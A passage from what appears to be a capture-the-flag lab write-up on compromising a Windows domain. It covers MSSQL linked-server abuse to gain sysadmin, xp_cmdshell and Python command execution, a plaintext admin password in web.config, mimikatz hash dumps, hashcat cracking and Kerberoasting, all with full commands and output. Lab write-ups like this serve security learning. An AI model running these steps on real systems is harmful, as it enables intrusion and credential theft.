0srvnetname           : COMPATIBILITY\\POO_CONFIGisremote             : Falserpc                  : Truepub                  : Falsesub                  : Falsedist                 : Falsedpub                 : Falserpcout               : Truedataaccess           : Truecollationcompatible  : Falsesystem               : Falseuseremotecollation   : Truelazyschemavalidation : Falsecollation            :nonsqlsub            : FalseFor the next parts, we’ll use the SQL Server Management Studio client because the quotes escaping in Powershell messes up our OPENQUERY commands and it’ll be easier to work with.We can enumerate the list of databases from POO_CONFIG but there is nothing interesting.select * from openquery(\"COMPATIBILITY\\POO_CONFIG\",'SELECT * FROM master.dbo.sysdatabases')master\t1\t0x01tempdb\t2\t0x01POO_CONFIG\t5\t0x4E6C9A727878684DA065E7C29005704DLet’s double check manually what PowerUpSQL has given us regarding internal_user and check if this user has sysadmin privileges:Unfortunately, we don’t have sysadmin on POO_CONFIGNow, if we use OPENQUERY from POO_CONFIG back to POO_PUBLIC we get interesting results.Sweet! We are running queries on POO_PUBLIC as user sa if we pass them through POO_CONFIG!We can use an openquery to find a previsouly hidden database (from our external_user) on COMPATIBILITY\\POO_PUBLICselect * from openquery(\"COMPATIBILITY\\POO_CONFIG\",'select * from openquery(\"COMPATIBILITY\\POO_PUBLIC\",''SELECT * FROM flag.dbo.flag'')')We found a flag in flag.dbo.flag: POO{88d829eb39f2d1...}MSSQL RCENext, we can create ourselves a user on COMPATIBILITY\\POO_PUBLIC with sysadmin privileges so we don’t need to go through linked servers again.EXECUTE('EXECUTE(''EXEC master..sp_addlogin ''''booya'''', ''''0wned123!'''''') AT \"COMPATIBILITY\\POO_PUBLIC\"') AT \"COMPATIBILITY\\POO_CONFIG\"And then add it the sysadmin privileges:EXECUTE('EXECUTE(''EXEC master..sp_addsrvrolemember ''''booya'''', ''''sysadmin'''''') AT \"COMPATIBILITY\\POO_PUBLIC\"') AT \"COMPATIBILITY\\POO_CONFIG\"Now that we have sysadmin privileges, we can execute commands using xp_cmdshell:PS C:\\Users\\snowscan&gt; $user = \"booya\"PS C:\\Users\\snowscan&gt; $pass = \"0wned123!\"PS C:\\Users\\snowscan&gt; get-sqlquery -verbose -instance $i -username $user -password $pass -query \"xp_cmdshell 'whoami'\"VERBOSE: 10.13.38.11,1433 : Connection Success.output------nt service\\mssql$poo_publicEven though we have sysadmin access in the database, we only a limited OS access with nt service\\mssql$poo_publicWe don’t have outbound IPv4 connectivity, the General Failure error message probably means there’s no IPv4 address on the interface:PS C:\\Users\\snowscan&gt; get-sqlquery -verbose -instance $i -username $user -password $pass -query \"xp_cmdshell 'ping 10.14.14.7'\"VERBOSE: 10.13.38.11,1433 : Connection Success.output------Pinging 10.14.14.7 with 32 bytes of data:General failure.General failure.General failure.General failure.Ping statistics for 10.14.14.7:    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),Local port enumeration shows that the WinRM port 5985 is listening for IPv6 connections: output ------  Active Connections    Proto  Local Address          Foreign Address        State   TCP    [::]:80                [::]:0                 LISTENING   TCP    [::]:135               [::]:0                 LISTENING   TCP    [::]:445               [::]:0                 LISTENING   TCP    [::]:1433              [::]:0                 LISTENING   TCP    [::]:5985              [::]:0                 LISTENING   TCP    [::]:41433             [::]:0                 LISTENING   TCP    [::]:47001             [::]:0                 LISTENING   TCP    [::]:49664             [::]:0                 LISTENING   TCP    [::]:49665             [::]:0                 LISTENING   TCP    [::]:49666             [::]:0                 LISTENING   TCP    [::]:49667             [::]:0                 LISTENING   TCP    [::]:49668             [::]:0                 LISTENING   TCP    [::]:49669             [::]:0                 LISTENING   TCP    [::]:49710             [::]:0                 LISTENING   TCP    [::1]:50280            [::]:0                 LISTENING   TCP    [::1]:50311            [::]:0                 LISTENINGThe IPv6 address is dead:babe::1001:PS C:\\Users\\snowscan&gt; get-sqlquery -verbose -instance $i -username $user -password $pass -query \"xp_cmdshell 'ipconfig /all'\"VERBOSE: 10.13.38.11,1433 : Connection Success.output------Windows IP Configuration   Host Name . . . . . . . . . . . . : COMPATIBILITY   Primary Dns Suffix  . . . . . . . : intranet.poo   Node Type . . . . . . . . . . . . : Hybrid   IP Routing Enabled. . . . . . . . : No   WINS Proxy Enabled. . . . . . . . : No   DNS Suffix Search List. . . . . . : intranet.pooEthernet adapter Ethernet0:   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection   Physical Address. . . . . . . . . : 00-50-56-8F-F7-4E   DHCP Enabled. . . . . . . . . . . : No   Autoconfiguration Enabled . . . . : Yes   IPv6 Address. . . . . . . . . . . : dead:babe::1001(Preferred)   Link-local IPv6 Address . . . . . : fe80::55b2:8257:8174:cc7%13(Preferred)   IPv4 Address. . . . . . . . . . . : 10.13.38.11(Preferred)   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : dead:babe::1                                       10.13.38.2   DNS Servers . . . . . . . . . . . : dead:babe::1                                       10.13.38.2   NetBIOS over Tcpip. . . . . . . . : DisabledWe can’t read anything interesting with this user:PS C:\\Users\\snowscan&gt; get-sqlquery -verbose -instance $i -username $user -password $pass -query \"xp_cmdshell 'type c:\\\\inetpub\\\\wwwroot\\\\web.config'\"VERBOSE: 10.13.38.11,1433 : Connection Success.output------Access is denied.We’ll need to look for another way in.Python to the rescueMSSQL supports python, we can find the local administrator password by doing system() calls.http://www.nielsberglund.com/2017/04/20/sql-server-2017-python-executing-from-sql/First, we need to make sure Python is enabled on the MSSQL server:EXEC sp_configure  'external scripts enabled', 1RECONFIGURE  WITH OVERRIDE  Next, let’s execute a simple script that’ll do a system() call and run Windows commands:So, the script is running as a different user than xp_cmdshell commands, we are now POO_PUBLIC01After looking around the filesystem for a while, we find the local Administrator credentials:EXEC sp_execute_external_script@language =N'Python',@script= N'import os; os.system(\"type c:\\\\inetpub\\\\wwwroot\\\\web.config\")';GO STDOUT message(s) from external script: C:\\PROGRA~1\\MICROS~1\\MSSQL1~1.POO\\MSSQL\\EXTENS~1\\POO_PUBLIC01\\A093E4EB-BBD9-4913-A10A-337EB23B1BBDSTDOUT message(s) from external script: &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt;    &lt;system.webServer&gt;        &lt;staticContent&gt;            &lt;mimeMap                fileExtension=\".DS_Store\"                mimeType=\"application/octet-stream\"            /&gt;        &lt;/staticContent&gt;        &lt;!--        &lt;authentication mode=\"Forms\"&gt;            &lt;forms name=\"login\" loginUrl=\"/admin\"&gt;                &lt;credentials passwordFormat = \"Clear\"&gt;                    &lt;user                         name=\"Administrator\"                         password=\"EverybodyWantsToWorkAtP.O.O.\"                    /&gt;                &lt;/credentials&gt;            &lt;/forms&gt;        &lt;/authentication&gt;        --&gt;    &lt;/system.webServer&gt;&lt;/configuration&gt;Express Edition will continue to be enforced.Local credentials  name: Administrator  password: EverybodyWantsToWorkAtP.O.O.FootholdRemember that we previously discovered WinRM was listening on port 5985 and IPv6.First, we need to setup our local attacker Windows 10 machine to trust the remote host and allow unencrypted connections (port 5985 is HTTP only).PS C:\\Windows\\system32&gt; winrm set winrm/config/client '@{AllowUnencrypted=\"true\"}'PS C:\\Windows\\system32&gt; winrm set winrm/config/client '@{TrustedHosts=\"[dead:babe::1001]\"}'Client    NetworkDelayms = 5000    URLPrefix = wsman    AllowUnencrypted = true    Auth        Basic = true        Digest = true        Kerberos = true        Negotiate = true        Certificate = true        CredSSP = false    DefaultPorts        HTTP = 5985        HTTPS = 5986    TrustedHosts = [dead:babe::1001]Then we’ll log in using the credentials we found in web.configPS C:\\Users\\snowscan&gt; $SecPassword = ConvertTo-SecureString 'EverybodyWantsToWorkAtP.O.O.' -AsPlainText -ForcePS C:\\Users\\snowscan&gt; $Credential = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword)PS C:\\Users\\snowscan&gt; enter-pssession -computername [dead:babe::1001] -credential $Credential[[dead:babe::1001]]: PS C:\\Users\\Administrator&gt; cd desktop[[dead:babe::1001]]: PS C:\\Users\\Administrator\\desktop&gt; dir    Directory: C:\\Users\\Administrator\\desktopMode                LastWriteTime         Length Name----                -------------         ------ -----a----        3/26/2018   5:29 PM             37 flag.txt[[dead:babe::1001]]: PS C:\\Users\\Administrator\\desktop&gt; type flag.txtPOO{ff87c4fe10e2ef09...}Another flag found: POO{ff87c4fe10e2ef09...}BackTrack flagThere’s another flag hidden in the admin directory of the webserver inside the iisstart.htm page:[[dead:babe::1001]]: PS C:\\&gt; get-childitem -recurse -path c:\\inetpub | select-string -pattern \"POO{\"inetpub\\wwwroot\\admin\\iisstart.htm:4:Flag : POO{4882bd2ccfd4b53...}inetpub\\wwwroot\\dev\\304c0c90fbc6520610abbf378e2339d1\\db\\poo_connection.txt:6:Flag : POO{fcfb0767f5bd3cbc22f...}inetpub\\wwwroot\\dev\\dca66d38fd916317687e1390a420c3fc\\db\\poo_connection.txt:6:Flag : POO{fcfb0767f5bd3cbc22f...}[[dead:babe::1001]]: PS C:\\&gt; type C:\\inetpub\\wwwroot\\admin\\iisstart.htm\"I can't go back to yesterday, because i was a different person then...\"&lt;br&gt;- Alice in Wonderland&lt;br&gt;&lt;br&gt;Flag : POO{4882bd2ccfd4b53...}Flag: POO{4882bd2ccfd4b53...}Turning up the heat with mimikatzSince we have local admin privs on the server we will upload mimikatz to find some passwords in memory:PS C:\\Users\\snowscan&gt; $session = new-pssession -computername [dead:babe::1001] -credential $CredentialPS C:\\Users\\snowscan&gt; copy-item -tosession $session -path c:\\users\\snowscan\\downloads\\mimikatz.exe -destination c:\\tempPS C:\\Users\\snowscan&gt; copy-item -tosession $session -path c:\\users\\snowscan\\downloads\\mimidrv.sys -destination c:\\tempPS C:\\Users\\snowscan&gt; copy-item -tosession $session -path c:\\users\\snowscan\\downloads\\mimilib.dll -destination c:\\tempThere’s a glitch running mimikatz.exe from our WinRM Sessinon, it keeps scrolling the screen and we can’t input anything.So we’ll just issue all commands on one line instead using .\\mimikatz.exe token::elevate lsadump::sam exitWe can grab the local account hashes but we are already local admin so these are pretty much useless.mimikatz(commandline) # lsadump::samDomain : COMPATIBILITYSysKey : 6dcfa5e3811b05c0a5206da6384f406fLocal SID : S-1-5-21-158512341-328150952-995267585SAMKey : 03229f5d2ecab8b1cc95959c14856dedRID  : 000001f4 (500)User : Administrator  Hash NTLM: a6678287c3e811f1eaef2f1986da157a    lm  - 0: 252720cc3ea62ef269fe2d0bce3dbad5    ntlm- 0: a6678287c3e811f1eaef2f1986da157a    ntlm- 1: 39b00baccb2ec3b25f175de4d5371709RID  : 000001f5 (501)User : GuestRID  : 000001f7 (503)User : DefaultAccountRID  : 000003ea (1002)User : POO_PUBLIC00  Hash NTLM: 42cc6a0e40743e9cb29411a68a4513c0    lm  - 0: 4a3d95f55be191afc9efe81330d1d01d    ntlm- 0: 42cc6a0e40743e9cb29411a68a4513c0RID  : 000003eb (1003)User : POO_PUBLIC01  Hash NTLM: 690c61db0425d35b3a1cc6cd9a7c6e9b    lm  - 0: f6767667be6b0cdc2d689cc975259342    ntlm- 0: 690c61db0425d35b3a1cc6cd9a7c6e9bRID  : 000003ec (1004)User : POO_PUBLIC02  Hash NTLM: 7e234179207ba2f0aac8ef8097763689    lm  - 0: 87d54ac6f13680f67e9acea7e2a63894    ntlm- 0: 7e234179207ba2f0aac8ef8097763689RID  : 000003ed (1005)User : POO_PUBLIC03  Hash NTLM: 9f60b98abc6b26428a7189b15ab130d0    lm  - 0: 0ed19b8dc5fd0199795dc27130a6d7e9    ntlm- 0: 9f60b98abc6b26428a7189b15ab130d0RID  : 000003ee (1006)User : POO_PUBLIC04  Hash NTLM: 25f6a1404e10a114ec112649e7651ac0    lm  - 0: 62509e9573a716316748f18bfe4d589f    ntlm- 0: 25f6a1404e10a114ec112649e7651ac0RID  : 000003ef (1007)User : POO_PUBLIC05  Hash NTLM: a5870e78fc723b557c714ab7f1bcadd2    lm  - 0: 24bfa8832a752169f0aeb95b1623e0f0    ntlm- 0: a5870e78fc723b557c714ab7f1bcadd2RID  : 000003f0 (1008)User : POO_PUBLIC06  Hash NTLM: f58bc106ba870fec60e50481f768f942    lm  - 0: 81dbc07dd0c22e23765796c2d4ec4969    ntlm- 0: f58bc106ba870fec60e50481f768f942RID  : 000003f1 (1009)User : POO_PUBLIC07  Hash NTLM: 9b9c11a445e2aea545f8938ac09b1922    lm  - 0: 44471764257c7fa1fcccdc51fc5455ff    ntlm- 0: 9b9c11a445e2aea545f8938ac09b1922RID  : 000003f2 (1010)User : POO_PUBLIC08  Hash NTLM: 157332d85d901b3a0adfca7fbbcd6af5    lm  - 0: d1efd49233e98fc94a1eb7ade4860415    ntlm- 0: 157332d85d901b3a0adfca7fbbcd6af5RID  : 000003f3 (1011)User : POO_PUBLIC09  Hash NTLM: c670d13961c29508381c0e121b8270c2    lm  - 0: 23c1f1862f1ae2d1a2d5dd3cbeae0a05    ntlm- 0: c670d13961c29508381c0e121b8270c2RID  : 000003f4 (1012)User : POO_PUBLIC10  Hash NTLM: c0b62fb43b73abe7b6c31dbf881e747b    lm  - 0: 7869a3a7ed47dee5e5321049dae24faa    ntlm- 0: c0b62fb43b73abe7b6c31dbf881e747bRID  : 000003f5 (1013)User : POO_PUBLIC11  Hash NTLM: 4f9400995fe130519c17f628d4ede212    lm  - 0: 86a4242463bd52d2eeb6e991eae1bf7d    ntlm- 0: 4f9400995fe130519c17f628d4ede212RID  : 000003f6 (1014)User : POO_PUBLIC12  Hash NTLM: ac89c4c406747afaa04b07f39889985f    lm  - 0: d1b082417e24f2e7c6d37e792db814c1    ntlm- 0: ac89c4c406747afaa04b07f39889985fRID  : 000003f7 (1015)User : POO_PUBLIC13  Hash NTLM: 6f593e0259a23d502368a934c090859d    lm  - 0: e48522c99e9a2b285d847ef147a0c8e4    ntlm- 0: 6f593e0259a23d502368a934c090859dRID  : 000003f8 (1016)User : POO_PUBLIC14  Hash NTLM: d8225db19d4d17aec00bcddbc7f51b8c    lm  - 0: 51b457e4c7987053becc8d58f3cb5627    ntlm- 0: d8225db19d4d17aec00bcddbc7f51b8cRID  : 000003f9 (1017)User : POO_PUBLIC15  Hash NTLM: 3e5794d444d5ba749132ea93cb721b7c    lm  - 0: f7e1c288f749daf0e4aa121189e45279    ntlm- 0: 3e5794d444d5ba749132ea93cb721b7cRID  : 000003fa (1018)User : POO_PUBLIC16  Hash NTLM: bf9d2e47676eec558780341f7321362c    lm  - 0: bdd2d7bb867c5d1de6efc5bc05eae4b2    ntlm- 0: bf9d2e47676eec558780341f7321362cRID  : 000003fb (1019)User : POO_PUBLIC17  Hash NTLM: 4696122ebd0587fa8686876167f3ca2f    lm  - 0: 64f4aa9ab787d9fe3501aaabae82b573    ntlm- 0: 4696122ebd0587fa8686876167f3ca2fRID  : 000003fc (1020)User : POO_PUBLIC18  Hash NTLM: eb2f582902e6564fd7cbaace3988a452    lm  - 0: a13cd634916ab840da1fc8b048d445dd    ntlm- 0: eb2f582902e6564fd7cbaace3988a452RID  : 000003fd (1021)User : POO_PUBLIC19  Hash NTLM: aa982b8ea00487831241cba3a6cd8a2d    lm  - 0: af7af1ae285f02c19660e7ed9ed2389b    ntlm- 0: aa982b8ea00487831241cba3a6cd8a2dRID  : 000003fe (1022)User : POO_PUBLIC20  Hash NTLM: 0e20a30da1637d53042d253d99e416ed    lm  - 0: 7b2ab4d63bc9a4c33a345bc5b9d49561    ntlm- 0: 0e20a30da1637d53042d253d99e416edRID  : 000003ff (1023)User : zc00l  Hash NTLM: 0ab5e584021f433f9d2e222e35c95261    lm  - 0: dccb3c3471701f949d318fdca8495be7    ntlm- 0: 0ab5e584021f433f9d2e222e35c95261The cache is much more interesting as we have two domain accounts here:[[dead:babe::1001]]: PS C:\\temp&gt; .\\mimikatz.exe token::elevate lsadump::cache exitmimikatz(commandline) # lsadump::cacheDomain : COMPATIBILITYSysKey : 6dcfa5e3811b05c0a5206da6384f406fLocal name : COMPATIBILITY ( S-1-5-21-158512341-328150952-995267585 )Domain name : POO ( S-1-5-21-2413924783-1155145064-2969042445 )Domain FQDN : intranet.pooPolicy subsystem is : 1.14LSA Key(s) : 1, default {686c3d5a-8dfb-714b-4a74-6ce5e45bd0f8}  [00] {686c3d5a-8dfb-714b-4a74-6ce5e45bd0f8} edde363d2913f57c555e9d3b2989e42d432c9fae46f8ca29572822ad3fcbc70e* Iteration is set to default (10240)[NL$1 - 3/22/2018 6:45:01 PM]RID       : 00000452 (1106)User      : POO\\p00_devMsCacheV2 : 7afecfd48f35f666ae9f6edd53506d0c[NL$2 - 3/22/2018 3:36:34 PM]RID       : 00000453 (1107)User      : POO\\p00_admMsCacheV2 : 32c28e9a78d7c3e7d2f84cbfcabebeedmimikatz(commandline) # exitBye!We’ll put those in a format hashcat can understand:$DCC2$10240#p00_dev#7afecfd48f35f666ae9f6edd53506d0c$DCC2$10240#p00_adm#32c28e9a78d7c3e7d2f84cbfcabebeedUsing hashcat, let’s try all the SecLists password wordlists with a rule (it takes a while since DDC2 is a slow hash):hashcat64 -a 0 -m 2100 -r rules\\best64.rule mscachev2.txt passwords\\*Bingo! We cracked the two hashes:  p00_dev: Development1!  p00_adm: ZQ!zaq1… but when we try p00_adm later we’ll find out that it’s an old password that doesn’t work.So what we’ll do instead is use invoke-kerberoast to get the TGS ticket hashes and crack them offline:SamAccountName       : p00_admDistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=pooServicePrincipalName : cyber_audit/intranet.poo:443Hash                 : $krb5tgs$23$*ID#124_DISTINGUISHED NAME:                        CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=fakedomain,DC=com SPN:                        F3514235-4C06-11D1-AB04-00D04FC2DCD2-GDCD/asdf.asdf.pd.fakedomain.com:50000 *9620431D1BC1A2DF294                       A18B600DC2059$B10813B73B0CBBA3446682112C221A01BDE25B8FCE87B66F3967CD45FFEE9E6446C16D4D90EA0956E3                       C9BEFDFC3C9855007C323BB99BC397063024FCB5CD34B3EFD0B1280A13F0D1200E543A6A71BEBB4AF120F20B32B7C4BE                       BBC8660F01B973B382697E934493127294DD302B7AB10A117B22C5FBEE38B0ECF5B0525BCCE1F437B03E00A8C58243FF                       9CA6EF986AE9D92335F5412C22D96E96592F8CB9AFA0F93966BFBC48DA58C2A2333169599301A236D36CE9B26EFA30F7                       A6ED991C0EB139D9293930F8DC7B4BBB8675ECF273EC4D218F349A188B314B569F57570C06FF1C2B0FB06B22C37FAF46                       78FF92B4D7FE37E14DBF3A5C383B12973B4509173D50688B431D33F5E8B97F009AA14218E787E3FBB4794BD930B38515                       82AEBD8935B8E399CC146FD8684D5FC4291643A11D6130F1D8879CAFEB48CE06C709D3D4FBC2AE10748960CB6CD3A12D                       C80F55996CD92237FC8C2A72593797AECA14B8DD1A3F46255C7158D23C2E673CC6217255A588AF9FA747B6535EA2937C                       808DA782BBBF6BEDDEEC84470AF914A35E581B735A288354A4CE9DA724C34C1AA1523D2730B6ECDF93FEBCE76309B969                       D9CDD71CA2762E932939AB56210340E95E4F8A6FE9B59F4C0FACA946FF96C0D46F00C6703A4531B768AB5DCAC09EAF52                       6CFE58FD1DE7C2E69E04C2124CC7104E71FADAC495027A5C7F72347EBA61FE119A5C5ACE54E1EE6E10BD4204775E83AD                       668767D59366F3D293E8747A9C7AD60345B74226FCE4FA3A65E1E04861BE3B2734361D4C5B5FA7632F44758110E4C912                       2F5B2F6144121EA3E6EE2DAD9C3350889B0D26CCEB506A136ECEC225ED18FC294DF62BDB7D6B4A14F448A6258D3C702D                       98371B1873B8738A4F4AAD87C5C3FCF65B7AD3B1E5AB81BF40DEBC05605130CDC82F35B6936A543746EB36C42A98893F                       659434436DC391B8CFFB3376EF323B5ABCA66345297221CC5038C0B6905185A9F1A3CED3537BBA4F3ECE5EEE6A363EFF                       FE9D532E6DB81DB29CCB4206E877E36B2AA5DB0DB1F0E430808C6E844277D51BF65D393123692E6381E3DB2219D782FA                       FAF49511A4692E3CD3650DD51D987522D6F06281E3A1FE84A7D1DD9028F08D1C66581BED8EA82E6FB0D67FAB73CC3FBB                       5FB2339A136FF7CE9D0E6E17D0FE50E84FC57D1A2B69BABEA4EA77EA2E0D036F6CE6B3BD3929E6EE50679C8CECEDA6FD                       1C46A345D9BBCC5A9163B643C0D0A66AB2D9A936CACEA7E14B659DF2F414833F8AB03404A947A49431C0E458D136D758                       EF79709F8BB580D85CC3B8F0D9990DE9EC193B770150A3ED3470019B7D5FFC0F9515F6AFC73C8D435166BE05D5F72506                       2E30367B707C9D7BC4D5D66CA8F82654EB5DD55AEE2FB15EF1D4BDFF0F01ED4040C2E1BDBBA1E41560EB156EF5C94F50                       7121CA4D0E76A1A6668F43A32933087F11273FCA0ABC89A53DCC3D69B8300AEBB30318090A6C7EBA72C91F8116EE8929                       0CB267D5hashcat64 -a 0 -m 13100 -r rules\\best64.rule tgshash.txt Passwords\\*Password found: ZQ!5t4rBloodhoundUnfortunately we can’t establish an interactive session with our two users:PS C:\\Users\\snowscan&gt; $SecPassword = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -ForcePS C:\\Users\\snowscan&gt; $Credential = New-Object System.Management.Automation.PSCredential('p00_adm', $SecPassword)PS C:\\Users\\snowscan&gt; enter-pssession -computername [dead:babe::1001] -credential $Credentialenter-pssession : Connecting to remote server [dead:babe::1001] failed with the following error message : Access is denied. For more information, see theabout_Remote_Troubleshooting Help topic.At line:1 char:1+ enter-pssession -computername [dead:babe::1001] -credential $Credenti ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: ([dead:babe::1001]:String) [Enter-PSSession], PSRemotingTransportException    + FullyQualifiedErrorId : CreateRemoteRunspaceFailedPS C:\\Users\\snowscan&gt; $SecPassword = ConvertTo-SecureString 'Development1!' -AsPlainText -ForcePS C:\\Users\\snowscan&gt; $Credential = New-Object System.Management.Automation.PSCredential('p00_dev', $SecPassword)PS C:\\Users\\snowscan&gt; enter-pssession -computername [dead:babe::1001] -credential $Credentialenter-pssession : Connecting to remote server [dead:babe::1001] failed with the following error message : Access is denied. For more information, see theabout_Remote_Troubleshooting Help topic.At line:1 char:1+ enter-pssession -computername [dead:babe::1001] -credential $Credenti ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: ([dead:babe::1001]:String) [Enter-PSSession], PSRemotingTransportException    + FullyQualifiedErrorId : CreateRemoteRunspaceFailedUsing MSSQL with xp_cmdshell, we can use Powerview to poke around the DC:logoncount             : 13badpasswordtime        : 4/11/2018 11:16:31 PMdescription            : Built-in account for administering the computer/domaindistinguishedname      : CN=Administrator,CN=Users,DC=intranet,DC=pooobjectclass            : {top, person, organizationalPerson, user}name                   : Administratorobjectsid              : S-1-5-21-2413924783-1155145064-2969042445-500samaccountname         : Administratorlogonhours             : {255, 255, 255, 255...}admincount             : 1codepage               : 0samaccounttype         : USER_OBJECTaccountexpires         : 1/1/1601 2:00:00 AMcountrycode            : 0whenchanged            : 4/11/2018 9:45:33 PMinstancetype           : 4objectguid             : 28181e2a-574b-4c3f-a3bb-8953283b3a9clastlogon              : 3/15/2018 12:31:41 AMlastlogoff             : 1/1/1601 2:00:00 AMobjectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata  : {3/22/2018 4:08:40 PM, 3/21/2018 7:17:00 PM, 3/16/2018 10:35:01 AM, 3/16/2018 10:35:01 AM...}memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=intranet,DC=poo, CN=Domain                          Admins,CN=Users,DC=intranet,DC=poo, CN=Enterprise Admins,CN=Users,DC=intranet,DC=poo,                          CN=Schema Admins,CN=Users,DC=intranet,DC=poo...}whencreated            : 3/16/2018 10:19:14 AMiscriticalsystemobject : Truebadpwdcount            : 28cn                     : Administratoruseraccountcontrol     : ACCOUNTDISABLE, NORMAL_ACCOUNTusncreated             : 8196primarygroupid         : 513pwdlastset             : 4/12/2018 12:45:33 AMusnchanged             : 69874NULLpwdlastset             : 1/1/1601 2:00:00 AMlogoncount             : 0badpasswordtime        : 1/1/1601 2:00:00 AMdescription            : Built-in account for guest access to the computer/domaindistinguishedname      : CN=Guest,CN=Users,DC=intranet,DC=pooobjectclass            : {top, person, organizationalPerson, user}name                   : Guestobjectsid              : S-1-5-21-2413924783-1155145064-2969042445-501samaccountname         : Guestcodepage               : 0samaccounttype         : USER_OBJECTaccountexpires         : NEVERcountrycode            : 0whenchanged            : 3/16/2018 10:19:14 AMinstancetype           : 4objectguid             : 89b1713e-77d0-4636-88f3-3f966396a869lastlogon              : 1/1/1601 2:00:00 AMlastlogoff             : 1/1/1601 2:00:00 AMobjectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata  : {3/16/2018 10:19:52 AM, 1/1/1601 12:00:01 AM}memberof               : CN=Guests,CN=Builtin,DC=intranet,DC=poowhencreated            : 3/16/2018 10:19:14 AMbadpwdcount            : 0cn                     : Guestuseraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORDusncreated             : 8197primarygroupid         : 514iscriticalsystemobject : Trueusnchanged             : 8197NULLpwdlastset             : 1/1/1601 2:00:00 AMlogoncount             : 0badpasswordtime        : 1/1/1601 2:00:00 AMdescription            : A user account managed by the system.distinguishedname      : CN=DefaultAccount,CN=Users,DC=intranet,DC=pooobjectclass            : {top, person, organizationalPerson, user}name                   : DefaultAccountobjectsid              : S-1-5-21-2413924783-1155145064-2969042445-503samaccountname         : DefaultAccountcodepage               : 0samaccounttype         : USER_OBJECTaccountexpires         : NEVERcountrycode            : 0whenchanged            : 3/16/2018 10:19:14 AMinstancetype           : 4objectguid             : ba3ccc6b-962c-47d8-a8c3-3dcb17a0a22clastlogon              : 1/1/1601 2:00:00 AMlastlogoff             : 1/1/1601 2:00:00 AMobjectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata  : {3/16/2018 10:19:52 AM, 1/1/1601 12:00:01 AM}memberof               : CN=System Managed Accounts Group,CN=Builtin,DC=intranet,DC=poowhencreated            : 3/16/2018 10:19:14 AMbadpwdcount            : 0cn                     : DefaultAccountuseraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORDusncreated             : 8198primarygroupid         : 513iscriticalsystemobject : Trueusnchanged             : 8198NULLlogoncount            : 68badpasswordtime       : 3/26/2018 12:45:09 PMdescription           : P.O.O. Domain Administratordistinguishedname     : CN=mr3ks,CN=Users,DC=intranet,DC=pooobjectclass           : {top, person, organizationalPerson, user}displayname           : mr3kslastlogontimestamp    : 3/30/2018 12:16:01 AMname                  : mr3ksobjectsid             : S-1-5-21-2413924783-1155145064-2969042445-1000samaccountname        : mr3kslogonhours            : {255, 255, 255, 255...}admincount            : 1codepage              : 0samaccounttype        : USER_OBJECTaccountexpires        : 1/1/1601 2:00:00 AMcountrycode           : 0whenchanged           : 3/29/2018 9:16:01 PMinstancetype          : 4objectguid            : 319c782b-5a67-445a-9118-4b5c9ec2bd59lastlogon             : 4/7/2018 1:50:00 PMlastlogoff            : 1/1/1601 2:00:00 AMobjectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata : {3/22/2018 3:58:57 PM, 3/22/2018 1:08:40 PM, 3/22/2018 12:32:59 PM, 3/21/2018 7:17:00 PM...}whencreated           : 3/16/2018 10:19:14 AMbadpwdcount           : 0cn                    : mr3ksuseraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORDusncreated            : 8199primarygroupid        : 512pwdlastset            : 3/22/2018 6:28:15 PMusnchanged            : 57372NULLlogoncount                    : 0badpasswordtime               : 1/1/1601 2:00:00 AMdescription                   : Key Distribution Center Service Accountdistinguishedname             : CN=krbtgt,CN=Users,DC=intranet,DC=pooobjectclass                   : {top, person, organizationalPerson, user}name                          : krbtgtprimarygroupid                : 513objectsid                     : S-1-5-21-2413924783-1155145064-2969042445-502samaccountname                : krbtgtadmincount                    : 1codepage                      : 0samaccounttype                : USER_OBJECTshowinadvancedviewonly        : Trueaccountexpires                : NEVERcn                            : krbtgtwhenchanged                   : 3/22/2018 4:08:40 PMinstancetype                  : 4objectguid                    : f726675e-d7e8-43bd-9c19-ce0e14b91038lastlogon                     : 1/1/1601 2:00:00 AMlastlogoff                    : 1/1/1601 2:00:00 AMobjectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata         : {3/22/2018 4:08:40 PM, 3/21/2018 7:17:00 PM, 3/16/2018 10:35:01 AM, 3/16/2018 10:19:52                                 AM...}serviceprincipalname          : kadmin/changepwmemberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=intranet,DC=poowhencreated                   : 3/16/2018 10:19:51 AMiscriticalsystemobject        : Truebadpwdcount                   : 0useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNTusncreated                    : 12324countrycode                   : 0pwdlastset                    : 3/16/2018 12:19:51 PMmsds-supportedencryptiontypes : 0usnchanged                    : 32891NULLlogoncount            : 0badpasswordtime       : 1/1/1601 2:00:00 AMdistinguishedname     : CN=p00_hr,CN=Users,DC=intranet,DC=pooobjectclass           : {top, person, organizationalPerson, user}name                  : p00_hrobjectsid             : S-1-5-21-2413924783-1155145064-2969042445-1105samaccountname        : p00_hrcodepage              : 0samaccounttype        : USER_OBJECTaccountexpires        : 1/1/1601 2:00:00 AMcountrycode           : 0whenchanged           : 3/21/2018 7:09:38 PMinstancetype          : 4objectguid   